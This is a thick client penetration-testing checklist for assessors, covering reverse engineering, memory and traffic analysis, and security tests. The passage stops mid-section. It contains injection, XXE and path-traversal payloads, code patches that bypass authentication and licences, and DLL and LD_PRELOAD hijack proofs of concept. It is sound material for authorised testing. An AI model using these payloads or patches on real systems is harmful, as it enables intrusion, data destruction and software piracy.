# Thick Client Technical Testing Checklist

Systematic methodology for testing thick client applications across all attack surfaces. Follow sequentially or jump to specific sections based on findings.

Related: [[THICK-01-Admin-Checklist]] | [[THICK-03-Request-Tracker]] | [[THICK-00-Overview]]

---

## Pre-Testing Setup

### Environment Preparation
- [ ] Clean VM snapshot created
- [ ] Testing tools installed and verified
  - [ ] dnSpy (for .NET applications)
  - [ ] Ghidra or IDA Pro (for native binaries)
  - [ ] Process Monitor (Procmon)
  - [ ] Process Explorer
  - [ ] Wireshark
  - [ ] Burp Suite
  - [ ] TCPView or netstat
  - [ ] Sysinternals Suite
  - [ ] strings utility
  - [ ] Hex editor
- [ ] Baseline network capture started
- [ ] Procmon capture configured with filters
- [ ] Documentation structure ready

### Initial Reconnaissance
- [ ] Application installed in test environment
- [ ] Installation directory mapped
- [ ] File inventory created (executables, DLLs, configs, resources)
- [ ] Process list before launch captured
- [ ] Registry snapshot taken (Windows)
- [ ] Network connections before launch captured
- [ ] File system permissions documented

---

## Phase 1: Static Analysis

### File System Analysis

#### Binary Inspection
- [ ] **Extract strings from main executable**
  ```powershell
  # Windows
  strings64.exe app.exe > strings_main.txt
  strings64.exe -e l app.exe > strings_unicode.txt  # Unicode strings
  
  # Linux
  strings app > strings_main.txt
  strings -e l app > strings_unicode.txt
  ```
- [ ] Search strings for sensitive data:
  - [ ] Passwords: `grep -i "password" strings_main.txt`
  - [ ] API keys: `grep -E "api[_-]?key|apikey" strings_main.txt`
  - [ ] Secrets: `grep -i "secret" strings_main.txt`
  - [ ] Tokens: `grep -i "token" strings_main.txt`
  - [ ] Connection strings: `grep -i "server=\|host=\|connectionstring" strings_main.txt`
  - [ ] URLs/endpoints: `grep -E "https?://" strings_main.txt`
  - [ ] Email addresses: `grep -E "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" strings_main.txt`
  - [ ] IP addresses: `grep -E "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" strings_main.txt`
- [ ] Document interesting strings in [[THICK-03-Request-Tracker]]

#### DLL/Library Analysis
- [ ] List all DLLs/shared libraries
  ```powershell
  # Windows
  Get-ChildItem "C:\Program Files\AppName" -Filter *.dll -Recurse
  
  # Linux
  ldd ./app
  find /opt/appname -name "*.so*"
  ```
- [ ] Run strings on each DLL/library
- [ ] Check DLL signing (Windows):
  ```powershell
  Get-AuthenticodeSignature "C:\Path\To\app.dll"
  ```
- [ ] Identify third-party libraries (check versions for known vulnerabilities)
- [ ] Check for missing/optional DLLs (potential DLL hijacking)

#### Configuration Files
- [ ] Locate all configuration files
  - [ ] Windows: `%APPDATA%`, `%LOCALAPPDATA%`, `%PROGRAMDATA%`, install directory
  - [ ] Linux: `~/.config`, `~/.local/share`, `/etc`, `/opt`
- [ ] Review each config file:
  - [ ] XML files: Check for credentials, keys, connection strings
  - [ ] JSON files: Check for secrets, API keys
  - [ ] INI files: Check for passwords, license keys
  - [ ] Binary configs: Extract with hex editor, look for patterns
- [ ] Test config file permissions
  - [ ] Windows: `icacls config.xml`
  - [ ] Linux: `ls -la config.json`
- [ ] Check for sensitive data storage:
  - [ ] Plaintext passwords
  - [ ] Base64-encoded secrets (decode and verify)
  - [ ] Weak encryption (reversible obfuscation)
  - [ ] Hardcoded API keys
- [ ] Document findings with screenshots

#### Database Files
- [ ] Locate local databases
  ```bash
  # Common formats
  find / -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null
  find / -name "*.mdb" -o -name "*.accdb" 2>/dev/null  # MS Access
  ```
- [ ] Open each database:
  ```bash
  sqlite3 database.db
  .tables
  .schema
  SELECT * FROM users;
  SELECT * FROM settings;
  ```
- [ ] Check for sensitive data:
  - [ ] User credentials
  - [ ] Session tokens
  - [ ] License information
  - [ ] Business data
  - [ ] Encryption keys
- [ ] Test database encryption:
  - [ ] Attempt to open without password
  - [ ] Check if encryption key is hardcoded
- [ ] Document database schema and sensitive tables

#### Resource Files
- [ ] Extract embedded resources (icons, images, manifests)
  ```powershell
  # Windows with ResourceHacker
  # File → Open → app.exe → View resources
  
  # Linux
  objdump -s -j .rodata app | strings
  ```
- [ ] Check for:
  - [ ] Embedded credentials in images (steganography)
  - [ ] Hardcoded values in resources
  - [ ] Debug symbols or comments
  - [ ] Embedded scripts or configuration

---

### Binary Security Analysis

#### Windows Binary Protections
- [ ] **Check protections with PEView or CFF Explorer**:
  ```powershell
  # Or PowerShell:
  $file = [System.IO.File]::ReadAllBytes("app.exe")
  # Check DOS/PE headers for protection flags
  ```
- [ ] **ASLR (Address Space Layout Randomization)**:
  - [ ] Enabled: `IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE` flag set
  - [ ] If disabled: Memory addresses predictable → easier exploitation
- [ ] **DEP/NX (Data Execution Prevention)**:
  - [ ] Enabled: `IMAGE_DLLCHARACTERISTICS_NX_COMPAT` flag set
  - [ ] If disabled: Code execution on stack/heap possible
- [ ] **Stack Canaries**:
  - [ ] Check for `/GS` compilation flag
  - [ ] If disabled: Stack buffer overflows easier to exploit
- [ ] **SafeSEH** (Structured Exception Handling):
  - [ ] Check SafeSEH table presence
  - [ ] If disabled: SEH exploitation possible
- [ ] **Control Flow Guard (CFG)**:
  - [ ] Check for `IMAGE_DLLCHARACTERISTICS_GUARD_CF`
  - [ ] If disabled: Control flow hijacking easier
- [ ] **Code Signing**:
  ```powershell
  Get-AuthenticodeSignature "app.exe"
  ```
  - [ ] Check certificate validity
  - [ ] Check certificate authority
  - [ ] Check signature timestamp
  - [ ] If unsigned or invalid: Integrity cannot be verified

#### Linux Binary Protections
- [ ] **Check protections with checksec**:
  ```bash
  checksec --file=./app
  # Or manually:
  readelf -l app | grep -E "GNU_STACK|GNU_RELRO"
  readelf -h app | grep "Type:"
  ```
- [ ] **PIE (Position Independent Executable)**:
  - [ ] Check: `Type: DYN (Shared object file)` or `Type: EXEC`
  - [ ] If disabled (EXEC): Memory addresses predictable
- [ ] **NX Bit (No-Execute)**:
  - [ ] Check: `GNU_STACK` should have flags `RW-` (not RWE)
  - [ ] If disabled (RWE): Code execution on stack possible
- [ ] **Stack Canaries**:
  - [ ] Check for `__stack_chk_fail` symbol:
    ```bash
    objdump -d app | grep stack_chk_fail
    ```
  - [ ] If absent: Stack buffer overflows easier
- [ ] **RELRO (Relocation Read-Only)**:
  - [ ] Full RELRO: `RELRO: FULL` - GOT cannot be overwritten
  - [ ] Partial RELRO: `RELRO: PARTIAL` - GOT overwrite possible
  - [ ] No RELRO: GOT completely writable
- [ ] **FORTIFY_SOURCE**:
  - [ ] Check for fortified functions: `objdump -d app | grep _chk`
  - [ ] If absent: Buffer overflows easier
- [ ] **Stripped Symbols**:
  ```bash
  file app
  readelf -s app | wc -l
  ```
  - [ ] If stripped: Reverse engineering harder (but not impossible)
  - [ ] If not stripped: Function names visible → easier analysis

#### Anti-Tampering & Obfuscation
- [ ] **Detect packing**:
  ```powershell
  # Windows - High entropy indicates packing
  # Use Detect It Easy (DIE) or PEiD
  
  # Linux
  entropy app  # If > 7.0, likely packed
  ```
- [ ] **Identify packer/obfuscator**:
  - [ ] Common packers: UPX, Themida, VMProtect, Enigma, MPRESS
  - [ ] .NET obfuscators: ConfuserEx, Dotfuscator, SmartAssembly
  - [ ] Try unpacking if identified
- [ ] **Anti-debugging checks**:
  - [ ] Windows: Check for `IsDebuggerPresent()`, `CheckRemoteDebuggerPresent()`
  - [ ] Linux: Check for `ptrace(PTRACE_TRACEME)`, `/proc/self/status`
  - [ ] Test by attaching debugger and observing behavior
- [ ] **Integrity checks**:
  - [ ] Look for self-verification code (checksum, hash validation)
  - [ ] Check if app detects modification
- [ ] **VM/Sandbox detection**:
  - [ ] Check for VM detection code (VMware, VirtualBox checks)
  - [ ] Registry checks for virtualization artifacts

---

### Decompilation & Reverse Engineering

#### .NET Applications
- [ ] **Open in dnSpy**:
  ```
  File → Open → app.exe
  ```
- [ ] **Navigate to entry point**:
  ```
  Analyze → Right-click assembly → Go to Entry Point
  ```
- [ ] **Search for interesting code** (Ctrl+Shift+K):
  - [ ] `password`
  - [ ] `license`, `trial`, `expired`
  - [ ] `IsValid`, `Check`, `Verify`
  - [ ] `Authenticate`, `Login`, `Authorize`
  - [ ] `Encrypt`, `Decrypt`, `Key`
  - [ ] `Admin`, `Role`, `Permission`
  - [ ] `ConnectionString`, `Database`
  - [ ] `API`, `Token`, `Secret`
- [ ] **Analyze authentication logic**:
  - [ ] Locate login/authentication methods
  - [ ] Check if validation is client-side only
  - [ ] Look for hardcoded credentials
  - [ ] Check password storage mechanism
  - [ ] Test authentication bypass possibilities
- [ ] **Analyze license validation**:
  - [ ] Locate license check methods
  - [ ] Identify license validation logic
  - [ ] Check for time-based validation
  - [ ] Check for hardware binding
  - [ ] Check for server-side validation
- [ ] **Analyze authorization logic**:
  - [ ] Identify role/permission checks
  - [ ] Check if checks are client-side only
  - [ ] Look for feature flags
  - [ ] Test privilege escalation possibilities
- [ ] **Export interesting code**:
  ```
  Right-click method → Export to Project
  File → Export to Project → Select methods → OK
  ```

#### Native Windows Applications (C/C++)
- [ ] **Open in Ghidra**:
  ```
  File → New Project → Import File → app.exe
  Double-click → Analyze → Yes (analyze with defaults)
  ```
- [ ] **Review strings** (Window → Defined Strings):
  - [ ] Sort by string content
  - [ ] Look for interesting strings identified earlier
  - [ ] Double-click string → Shows cross-references (where it's used)
- [ ] **Identify main function**:
  - [ ] Look for `WinMain` (Windows) or `main` (console)
  - [ ] Follow execution flow
- [ ] **Identify interesting functions**:
  - [ ] Search for imported functions (Window → Symbol Tree):
    - [ ] `CreateFile`, `ReadFile`, `WriteFile` (file operations)
    - [ ] `RegOpenKey`, `RegQueryValue` (registry operations)
    - [ ] `InternetConnect`, `HttpSendRequest` (network)
    - [ ] `CryptEncrypt`, `CryptDecrypt` (crypto)
  - [ ] Right-click → Find references to see usage
- [ ] **Analyze authentication/validation**:
  - [ ] Follow code paths for validation logic
  - [ ] Check for comparison operations (JZ, JNZ, TEST, CMP)
  - [ ] Identify bypass opportunities (flip jumps)
- [ ] **Document findings with annotated screenshots**

#### Linux Native Applications
- [ ] **Open in Ghidra** (same as Windows above)
- [ ] **Alternative: Use objdump for quick analysis**:
  ```bash
  # Disassemble main
  objdump -d app | less
  
  # Find main function
  objdump -d app | grep -A 50 "<main>:"
  
  # Search for specific calls
  objdump -d app | grep "call.*password"
  ```
- [ ] **Check for symbol table** (easier if not stripped):
  ```bash
  nm app | grep -i "password\|license\|valid"
  ```
- [ ] **Identify shared library dependencies**:
  ```bash
  ldd app
  objdump -p app | grep NEEDED
  ```

#### Java Applications
- [ ] **Extract JAR**:
  ```bash
  unzip app.jar -d extracted/
  ```
- [ ] **Decompile with JADX**:
  ```bash
  jadx app.jar -d decompiled/
  # Or use JADX GUI
  ```
- [ ] **Review decompiled code**:
  - [ ] Search for hardcoded credentials
  - [ ] Check connection strings
  - [ ] Review authentication logic
  - [ ] Check for SQL injection vulnerabilities
  - [ ] Look for deserialization (ObjectInputStream)
  - [ ] Check for insecure crypto usage
- [ ] **Check for obfuscation**:
  - [ ] Obfuscated class/method names (a.b.c, aa, ab)
  - [ ] String encryption
  - [ ] Control flow obfuscation

#### Electron Applications
- [ ] **Extract ASAR archive**:
  ```bash
  npm install -g asar
  asar extract resources/app.asar output/
  ```
- [ ] **Review JavaScript code**:
  ```bash
  grep -r "password\|api\|key\|secret" output/
  ```
- [ ] **Check Electron security**:
  - [ ] Open main.js or main process file
  - [ ] Look for `BrowserWindow` creation
  - [ ] Check webPreferences:
    ```javascript
    // VULNERABLE CONFIG:
    new BrowserWindow({
      webPreferences: {
        nodeIntegration: true,         // BAD!
        contextIsolation: false,       // BAD!
        enableRemoteModule: true,      // BAD!
        webSecurity: false             // BAD!
      }
    });
    ```
  - [ ] If `nodeIntegration: true` → RCE possible via DevTools
- [ ] **Check for hardcoded credentials in JavaScript**
- [ ] **Review package.json** for vulnerable dependencies:
  ```bash
  npm audit
  ```

---

## Phase 2: Dynamic Analysis

### Process Monitoring

#### Windows - Process Monitor
- [ ] **Start Procmon with filters**:
  ```
  Filter → Add:
    - Process Name is app.exe → Include
    - Process Name is System → Exclude
  Clear display (Ctrl+X)
  ```
- [ ] **Launch application and observe**:
  - [ ] File operations (CreateFile, ReadFile, WriteFile)
  - [ ] Registry operations (RegOpenKey, RegQueryValue, RegSetValue)
  - [ ] Network operations (TCP Send, TCP Receive)
- [ ] **Look for sensitive file access**:
  - [ ] Config files with passwords
  - [ ] Database files
  - [ ] Temporary files
  - [ ] Log files with sensitive data
- [ ] **Check file/registry permissions**:
  - [ ] Right-click operation → Properties → Path
  - [ ] Note if files are world-writable
- [ ] **Save capture**: File → Save → All Events → CSV
- [ ] **Document interesting operations**

#### Linux - strace
- [ ] **Trace application**:
  ```bash
  strace -f -o strace.log ./app
  # Or attach to running process:
  strace -f -p $(pidof app) -o strace.log
  ```
- [ ] **Review trace log**:
  ```bash
  # File operations
  grep "open\|read\|write" strace.log
  
  # Network operations
  grep "connect\|socket\|send\|recv" strace.log
  
  # Process execution
  grep "execve\|fork" strace.log
  
  # Sensitive syscalls
  grep "ptrace\|prctl" strace.log
  ```
- [ ] **Check file access**:
  ```bash
  grep "open.*config\|open.*password" strace.log
  ```

#### Process Explorer (Windows)
- [ ] Launch Process Explorer as Administrator
- [ ] **Find application process**
- [ ] **Check properties**:
  - [ ] Security tab: User context, integrity level
  - [ ] Image tab: Path, command line, current directory
  - [ ] Strings tab: Memory strings (useful for finding loaded passwords)
  - [ ] TCP/IP tab: Active connections
  - [ ] Environment tab: Environment variables
- [ ] **Check loaded DLLs** (View → Lower Pane View → DLLs):
  - [ ] Note any missing DLLs (potential DLL hijacking)
  - [ ] Check DLL search order
  - [ ] Note unsigned DLLs
- [ ] **Monitor real-time**:
  - [ ] CPU usage spikes (crypto operations?)
  - [ ] Network activity
  - [ ] Handle count (resource leaks?)

---

### Memory Analysis

#### Dump Process Memory
**Windows**:
```powershell
# Using ProcDump (Sysinternals)
procdump64.exe -ma <PID> app_dump.dmp

# Or Task Manager:
# Right-click process → Create dump file
```

**Linux**:
```bash
# Using GDB
sudo gdb -p $(pidof app)
(gdb) generate-core-file app.core
(gdb) quit

# Or using gcore
sudo gcore $(pidof app)
```

- [ ] **Search memory dump for sensitive data**:
  ```powershell
  # Windows
  strings64.exe app_dump.dmp > memory_strings.txt
  Select-String -Path memory_strings.txt -Pattern "password|api|key|token"
  
  # Linux
  strings app.core | grep -iE "password|api|key|token|secret"
  ```
- [ ] **Look for**:
  - [ ] Plaintext passwords
  - [ ] Session tokens
  - [ ] API keys
  - [ ] Encryption keys
  - [ ] Connection strings
  - [ ] Sensitive business data
- [ ] **Document findings with memory offsets**

#### Live Memory Inspection
- [ ] **Cheat Engine (Windows)**:
  ```
  1. Open Cheat Engine → Select process
  2. Scan Type: String
  3. Value: [known value, e.g., username]
  4. First Scan
  5. Interact with app
  6. Next Scan
  7. Find memory address
  8. Right-click → Browse this memory region
  9. Look for nearby sensitive data (passwords often near usernames)
  ```
- [ ] **GDB (Linux)**:
  ```bash
  sudo gdb -p $(pidof app)
  (gdb) info proc mappings
  (gdb) dump memory region.bin 0xSTART 0xEND
  (gdb) find 0xSTART, 0xEND, "password"
  ```

---

### Network Traffic Analysis

#### Capture Network Traffic
- [ ] **Start Wireshark capture**:
  ```
  Capture → Options
  Select interface (Ethernet/Wi-Fi)
  Start
  ```
- [ ] **Start application** and perform various functions
- [ ] **Filter traffic by process** (Windows with Sysmon):
  ```
  frame.process_name == "app.exe"
  ```

#### Analyze HTTP/HTTPS Traffic
- [ ] **Filter HTTP traffic**: `http`
- [ ] **Check for sensitive data in plaintext**:
  - [ ] Credentials in GET parameters
  - [ ] POST body with passwords/tokens
  - [ ] Headers with API keys
  ```
  http.request.method == "POST" and frame contains "password"
  ```
- [ ] **Check authentication mechanisms**:
  - [ ] Basic Auth (easily decoded)
  - [ ] Custom auth headers
  - [ ] Token-based auth
- [ ] **Export HTTP objects**: File → Export Objects → HTTP

#### Analyze Custom Protocols
- [ ] **Identify protocol** (TCP/UDP, port number)
- [ ] **Follow TCP stream**: Right-click packet → Follow → TCP Stream
- [ ] **Look for**:
  - [ ] Plaintext data transmission
  - [ ] Structured data (XML, JSON, binary)
  - [ ] Authentication sequences
  - [ ] Session management
- [ ] **Check encryption**:
  - [ ] Is data encrypted?
  - [ ] If encrypted, is it TLS/SSL or custom?
  - [ ] Check for weak crypto (observable patterns)

#### SSL/TLS Analysis
- [ ] **Check TLS version** (should be TLS 1.2 or 1.3):
  ```
  tls.handshake.version
  ```
- [ ] **Check cipher suites** (should be strong):
  - [ ] Weak: DES, 3DES, RC4, MD5, export ciphers
  - [ ] Good: AES-GCM, ChaCha20-Poly1305
- [ ] **Check certificate validation**:
  - [ ] Export server certificate
  - [ ] Check validity period
  - [ ] Check certificate authority
  - [ ] Check common name/SANs

#### Proxy Traffic Through Burp Suite
- [ ] **Configure Burp listener**:
  ```
  Proxy → Options → Add
  Bind to port: 8080
  Bind to address: All interfaces
  Support invisible proxying: YES (for non-HTTP-aware apps)
  ```
- [ ] **Configure application to use proxy**:
  ```powershell
  # System-wide (Windows)
  netsh winhttp set proxy 127.0.0.1:8080
  
  # Or configure in app settings if available
  ```
- [ ] **Install Burp CA certificate**:
  ```
  1. Browse to http://burp in proxy-aware browser
  2. Download CA certificate
  3. Windows: certmgr.msc → Trusted Root → Import
  4. Linux: Copy to /usr/local/share/ca-certificates/ → update-ca-certificates
  ```
- [ ] **Intercept and analyze traffic**:
  - [ ] Check all HTTP/HTTPS requests
  - [ ] Look for API endpoints
  - [ ] Test for IDOR, parameter tampering
  - [ ] Check session management
  - [ ] Export interesting requests to [[THICK-03-Request-Tracker]]

---

### File System Analysis (Runtime)

#### Monitor File Operations
- [ ] **Use Procmon** (Windows) to track:
  - [ ] Config file reads/writes
  - [ ] Database access
  - [ ] Temporary file creation
  - [ ] Log file writes
- [ ] **Check file permissions during runtime**:
  ```powershell
  icacls "C:\Path\To\ConfigFile.xml"
  # Check if BUILTIN\Users has modify access
  ```
- [ ] **Monitor for temporary files**:
  ```powershell
  # Windows temp
  dir $env:TEMP | Sort-Object LastWriteTime | Select -Last 10
  
  # Linux temp
  ls -lt /tmp | head
  ```

#### Test File Manipulation
- [ ] **Modify configuration files**:
  - [ ] Change role/permission values
  - [ ] Modify license/trial information
  - [ ] Change feature flags
  - [ ] Test for insufficient validation
- [ ] **Test for path traversal**:
  - [ ] If app accepts file paths, try `../../../sensitive_file`
  - [ ] Check file upload/download functions
- [ ] **Test file permissions**:
  - [ ] Can unprivileged user modify config files?
  - [ ] Can unprivileged user modify database files?
  - [ ] Can unprivileged user access sensitive data?

---

### Registry Analysis (Windows Only)

#### Monitor Registry Access
- [ ] **Use Procmon** to track:
  - [ ] `RegOpenKey` - Opening registry keys
  - [ ] `RegQueryValue` - Reading values
  - [ ] `RegSetValue` - Writing values
- [ ] **Common application registry locations**:
  ```
  HKEY_CURRENT_USER\Software\CompanyName\AppName
  HKEY_LOCAL_MACHINE\SOFTWARE\CompanyName\AppName
  HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\CompanyName\AppName (32-bit on 64-bit)
  ```

#### Inspect Registry Keys
- [ ] **Manual inspection**:
  ```powershell
  Get-ItemProperty "HKCU:\Software\AppName" | Format-List
  Get-ItemProperty "HKLM:\SOFTWARE\AppName" | Format-List
  ```
- [ ] **Search for sensitive data**:
  ```powershell
  Get-ChildItem -Path "HKCU:\Software" -Recurse -ErrorAction SilentlyContinue | 
    Get-ItemProperty | 
    Where-Object { 
      $_.PSObject.Properties.Value -match "password|key|token|license" 
    }
  ```
- [ ] **Check for**:
  - [ ] Hardcoded passwords or keys
  - [ ] License keys or trial information
  - [ ] User credentials
  - [ ] API tokens
  - [ ] Feature flags

#### Test Registry Manipulation
- [ ] **Modify registry values**:
  ```powershell
  Set-ItemProperty -Path "HKCU:\Software\AppName" -Name "TrialExpired" -Value 0
  Set-ItemProperty -Path "HKCU:\Software\AppName" -Name "IsPremium" -Value 1
  ```
- [ ] **Test if app validates registry values**
- [ ] **Check registry permissions**:
  ```powershell
  Get-Acl "HKCU:\Software\AppName" | Format-List
  ```

---

## Phase 3: Security Testing

### Authentication Testing

#### Credential Storage
- [ ] **Locate stored credentials**:
  - [ ] Config files (plaintext, base64, encrypted)
  - [ ] Database files
  - [ ] Registry (Windows)
  - [ ] Keychain/Credential Manager
  - [ ] Memory
- [ ] **Test credential extraction**:
  - [ ] Can credentials be extracted easily?
  - [ ] Are they encrypted?
  - [ ] Is encryption reversible?
  - [ ] Is encryption key hardcoded?
- [ ] **Test "Remember Me" functionality**:
  - [ ] Where are credentials stored?
  - [ ] Are they encrypted?
  - [ ] Can they be extracted?

#### Authentication Bypass
- [ ] **Client-side validation bypass**:
  - [ ] Patch validation logic (dnSpy for .NET)
  - [ ] Modify comparison operations
  - [ ] Force authentication success
  ```csharp
  // Example .NET bypass in dnSpy:
  // BEFORE:
  if (user.Password == hashedPassword) {
      return true;
  }
  // AFTER:
  if (true) {  // Bypass
      return true;
  }
  ```
- [ ] **Test for hardcoded credentials**:
  - [ ] Search decompiled code for username/password
  - [ ] Test identified credentials
- [ ] **Test default credentials**:
  - [ ] admin/admin, admin/password, root/root
  - [ ] Vendor default credentials
- [ ] **Test for backdoor accounts**:
  - [ ] Look for special usernames
  - [ ] Test documented "god mode" accounts

#### Session Management
- [ ] **Identify session mechanism**:
  - [ ] Session tokens (where stored?)
  - [ ] Session cookies
  - [ ] JWT tokens
- [ ] **Test session fixation**:
  - [ ] Can session be predicted/fixed?
  - [ ] Is new session generated on login?
- [ ] **Test session timeout**:
  - [ ] Does session expire?
  - [ ] Can expired session be reused?
- [ ] **Test session token security**:
  - [ ] Is token random/unpredictable?
  - [ ] Is token transmitted securely?
  - [ ] Can token be stolen from disk/memory?

---

### Authorization Testing

#### Role/Permission Bypass
- [ ] **Identify authorization checks**:
  - [ ] Locate permission check methods
  - [ ] Check if validation is client-side only
- [ ] **Test privilege escalation**:
  - [ ] Login as low-privilege user
  - [ ] Identify privileged functions
  - [ ] Patch permission checks (dnSpy)
  - [ ] Test if privileged functions accessible
  ```csharp
  // Example .NET bypass:
  // BEFORE:
  if (user.IsAdmin) {
      ShowAdminPanel();
  }
  // AFTER:
  if (true) {  // Force admin
      ShowAdminPanel();
  }
  ```
- [ ] **Test role switching**:
  - [ ] Modify role in config file/database/registry
  - [ ] Check if validated server-side
- [ ] **Test for IDOR** (Insecure Direct Object Reference):
  - [ ] Modify user IDs in requests
  - [ ] Modify file paths in requests
  - [ ] Test access to other users' data

---

### License/Trial Bypass

#### Time-Based Restrictions
- [ ] **Identify trial logic**:
  - [ ] Search for "trial", "expired", "demo" in decompiled code
  - [ ] Locate date comparison logic
- [ ] **Test time manipulation**:
  - [ ] Change system clock to past/future
  - [ ] Does trial extend/reset?
- [ ] **Patch time checks**:
  ```csharp
  // BEFORE:
  if (DateTime.Now > trialEndDate) {
      ShowTrialExpiredMessage();
  }
  // AFTER:
  if (false) {  // Never expires
      ShowTrialExpiredMessage();
  }
  ```
- [ ] **Check for**:
  - [ ] Trial end date in config/registry/database
  - [ ] Can trial date be modified?
  - [ ] Is validation server-side?

#### License Key Validation
- [ ] **Locate license validation code**
- [ ] **Reverse engineer license algorithm**:
  - [ ] Checksum-based?
  - [ ] Cryptographic signature?
  - [ ] Server validation?
- [ ] **Test for**:
  - [ ] Hardcoded valid license keys
  - [ ] Weak license generation algorithm
  - [ ] Client-side validation only
- [ ] **Generate valid license** (if algorithm is weak)
- [ ] **Patch license check**:
  ```csharp
  // BEFORE:
  if (ValidateLicense(licenseKey)) {
      return true;
  }
  // AFTER:
  if (true) {  // Always valid
      return true;
  }
  ```

#### Hardware Binding
- [ ] **Identify hardware binding mechanism**:
  - [ ] MAC address
  - [ ] CPU ID
  - [ ] HDD serial number
  - [ ] Windows MachineGuid
- [ ] **Test hardware ID extraction**:
  - [ ] Can hardware ID be extracted from license file?
- [ ] **Test portability**:
  - [ ] Copy app to different machine
  - [ ] Does license still work?
- [ ] **Patch hardware checks** if client-side only

#### Feature Restrictions
- [ ] **Identify feature flags**:
  - [ ] Config file settings
  - [ ] Registry values
  - [ ] Database fields
- [ ] **Modify feature flags**:
  ```powershell
  Set-ItemProperty -Path "HKCU:\Software\AppName" -Name "EnablePremiumFeatures" -Value 1
  ```
- [ ] **Test if features become accessible**
- [ ] **Patch feature checks in code**

---

### Input Validation Testing

#### SQL Injection (Client-Server Apps)
- [ ] **Identify SQL queries** in decompiled code
- [ ] **Test for SQLi in input fields**:
  ```
  ' OR '1'='1
  '; DROP TABLE users; --
  admin'--
  1' UNION SELECT null,username,password FROM users--
  ```
- [ ] **Check query construction**:
  ```java
  // VULNERABLE:
  String query = "SELECT * FROM users WHERE name='" + userName + "'";
  
  // SAFE:
  PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE name=?");
  stmt.setString(1, userName);
  ```
- [ ] **Test error messages**:
  - [ ] Do errors reveal database structure?
  - [ ] SQL error messages shown to user?

#### Command Injection
- [ ] **Identify command execution** in code:
  ```csharp
  // C# example:
  Process.Start("ping", userInput);
  ```
- [ ] **Test for command injection**:
  ```
  ; whoami
  | dir
  && calc.exe
  `id`
  $(whoami)
  ```
- [ ] **Test file path inputs**:
  ```
  ../../../windows/system32/config/sam
  ../../etc/passwd
  ```

#### XML/XXE Injection
- [ ] **If app parses XML**, test for XXE:
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
  ]>
  <root>
    <data>&xxe;</data>
  </root>
  ```
- [ ] **Check if external entities are parsed**

#### Buffer Overflow (Native Apps)
- [ ] **Identify unsafe string operations**:
  ```c
  // C/C++ vulnerable functions:
  strcpy(dest, src);        // No bounds check
  sprintf(buf, "%s", input); // No bounds check
  gets(input);              // No bounds check
  ```
- [ ] **Test with long inputs**:
  ```python
  "A" * 1000
  "A" * 10000
  cyclic(1000)  # Pattern for finding offset
  ```
- [ ] **Monitor for crashes**:
  - [ ] Access violations
  - [ ] Segmentation faults
  - [ ] Unexpected exits
- [ ] **If crash occurs**:
  - [ ] Attach debugger
  - [ ] Find offset
  - [ ] Check if exploitable (control EIP/RIP)

---

### Cryptography Testing

#### Identify Crypto Usage
- [ ] **Search for crypto functions**:
  ```
  # .NET (in dnSpy):
  AesCryptoServiceProvider
  RijndaelManaged
  DESCryptoServiceProvider
  MD5CryptoServiceProvider
  SHA1, SHA256
  
  # Native (in Ghidra):
  CryptEncrypt, CryptDecrypt
  EVP_EncryptInit, EVP_DecryptInit
  ```

#### Weak Algorithms
- [ ] **Check for weak algorithms**:
  - [ ] DES (broken)
  - [ ] 3DES (deprecated)
  - [ ] RC4 (broken)
  - [ ] MD5 (collision attacks)
  - [ ] SHA1 (deprecated for signatures)
- [ ] **Document usage and recommend alternatives**

#### Key Management
- [ ] **Locate encryption keys**:
  - [ ] Hardcoded in binary
  - [ ] In config files
  - [ ] In resources
  - [ ] Derived from predictable values
- [ ] **Test key extraction**:
  ```bash
  strings app.exe | grep -E ".{16,32}" # Look for AES keys (128/256 bit)
  ```
- [ ] **Check key storage**:
  - [ ] Is key protected? (DPAPI on Windows, Keychain on macOS)
  - [ ] Can key be easily extracted?
- [ ] **Test for static keys**:
  - [ ] Same key across all installations?
  - [ ] Key embedded in code?

#### Encryption Implementation
- [ ] **Check for ECB mode** (reveals patterns):
  ```csharp
  // BAD:
  aes.Mode = CipherMode.ECB;
  
  // GOOD:
  aes.Mode = CipherMode.CBC; // or GCM
  ```
- [ ] **Check for IV reuse**:
  - [ ] Static IV (predictable)
  - [ ] Random IV (good)
- [ ] **Check for padding oracle vulnerabilities**
- [ ] **Test for custom crypto** (usually broken)

---

### DLL/Library Hijacking (Windows)

#### Identify Missing DLLs
- [ ] **Launch app with Process Monitor**
- [ ] **Filter for**:
  - [ ] Result: NAME NOT FOUND
  - [ ] Path: ends with .dll
- [ ] **Document missing DLLs** and search order

#### Test DLL Hijacking
- [ ] **Create malicious DLL**:
  ```cpp
  // dllmain.cpp
  #include <windows.h>
  
  BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
      if (reason == DLL_PROCESS_ATTACH) {
          WinExec("calc.exe", SW_SHOW);
      }
      return TRUE;
  }
  ```
- [ ] **Compile DLL**:
  ```cmd
  cl /LD dllmain.cpp /link /DLL
  ```
- [ ] **Place DLL in search path**:
  1. Application directory (highest priority)
  2. System32 (requires admin)
  3. System directory
  4. Windows directory
  5. Current directory
  6. PATH directories
- [ ] **Launch application**
- [ ] **Verify exploitation** (calc.exe should launch)
- [ ] **Document with screenshots**:
  - [ ] Procmon showing NAME NOT FOUND
  - [ ] Malicious DLL in directory
  - [ ] Calc.exe launched (or other PoC)

#### DLL Proxying (Advanced)
- [ ] **If app requires actual DLL functions**:
  1. Export same functions as original DLL
  2. Forward calls to original DLL
  3. Add malicious code in DllMain
- [ ] **Use DLL Export Viewer** to identify required exports

---

### Shared Library Hijacking (Linux)

#### LD_PRELOAD Attack
- [ ] **Create malicious .so**:
  ```c
  // evil.c
  #include <stdio.h>
  #include <stdlib.h>
  
  __attribute__((constructor))
  void before_main(void) {
      printf("[*] Hijacked!\n");
      system("/bin/bash");
  }
  ```
- [ ] **Compile**:
  ```bash
  gcc -shared -fPIC evil.c -o evil.so
  ```
- [ ] **Test**:
  ```bash
  LD_PRELOAD=./evil.so ./app
  ```
- [ ] **Verify shell spawned**

#### LD_LIBRARY_PATH Attack
- [ ] **Identify app dependencies**:
  ```bash
